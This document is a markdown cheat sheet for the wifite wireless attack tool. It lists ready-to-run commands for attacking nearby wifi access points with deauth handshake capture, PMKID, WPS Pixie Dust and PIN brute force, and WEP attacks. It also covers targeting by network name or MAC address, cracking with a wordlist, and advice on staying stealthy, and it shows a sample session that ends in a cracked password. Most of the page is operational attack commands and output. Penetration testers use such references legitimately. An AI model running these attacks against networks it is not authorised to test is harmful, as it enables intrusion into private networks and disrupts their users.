# wifite — automated wireless auditor

> **One-button wifi attack tool.** Wraps airodump/aireplay/reaver/bully/hashcat and tries every attack against nearby APs.

**Install check:** `wifite --help`

---

## 🎯 Cheat-flow

```bash
sudo wifite                                # interactive pick
sudo wifite --kill                         # kill interfering procs first
sudo wifite -i wlan0mon --wpa              # target WPA only
sudo wifite --wps                          # WPS attacks only
sudo wifite --pmkid                        # PMKID only (fast)
sudo wifite -e "TargetNet"                 # target by ESSID
sudo wifite -b AA:BB:CC:DD:EE:FF           # target by BSSID
sudo wifite --dict /usr/share/wordlists/rockyou.txt
sudo wifite --no-deauths                   # stealthier
```

---

## 🔑 Attacks wifite tries

| Attack | Works against |
|---|---|
| **PMKID** (hashcat mode 22000) | WPA/WPA2 — no client needed |
| **WPA handshake** (airodump + deauth) | WPA/WPA2 with at least one client |
| **WPS Pixie Dust** (reaver/bully `-K`) | Vulnerable WPS chipsets |
| **WPS PIN brute** | WPS, online brute |
| **WPS NULL PIN** | Specific broken firmware |
| **WEP** (ARP replay, fragmentation, chopchop) | WEP (legacy) |

Captured hashes saved to `hs/` in the CWD; cracked passwords to `wifite.log`.

---

## 🔑 Common flags

| Flag | Meaning |
|---|---|
| `-i <iface>` | Interface |
| `--kill` | Kill conflicting services first |
| `--wpa`, `--wps`, `--wep`, `--pmkid` | Limit attack types |
| `-e <ESSID>` / `-b <BSSID>` | Filter target |
| `-c <ch>` | Fix channel |
| `--dict <file>` | Wordlist for cracking |
| `--no-deauths` | Don't send deauth frames |
| `--num-deauths <N>` | Count per round |
| `--wpat <sec>` | WPA handshake timeout |
| `--reaver` / `--bully` | Choose WPS tool |

---

## 📋 Typical session

```text
sudo wifite --kill
[ scans all channels, lists targets ]
[+] select target(s) to attack (1-12, all): 3
[+] TargetNet (WPA): capturing handshake via deauth
[+] handshake captured to hs/TargetNet_AA-BB-CC-DD-EE-FF.cap
[+] cracking with aircrack-ng... password: "SuperSecret!"
```

---

## ⚠️ Gotchas

- Uses a **lot** of deauths by default — very noisy. Use `--no-deauths` or low count for stealth.
- If cracking fails wifite still keeps the handshake — crack later with [hashcat](hashcat.md) or [aircrack-ng](aircrack-ng.md).
- Must have a monitor-mode capable card with injection.
- Modern APs with 802.11w resist deauth; PMKID or WPS may still succeed.

---

## 🔗 Related

- [airodump-ng](airodump-ng.md) · [aireplay-ng](aireplay-ng.md) · [aircrack-ng](aircrack-ng.md) · [reaver](reaver.md) · [wash](wash.md) · [hashcat](hashcat.md)
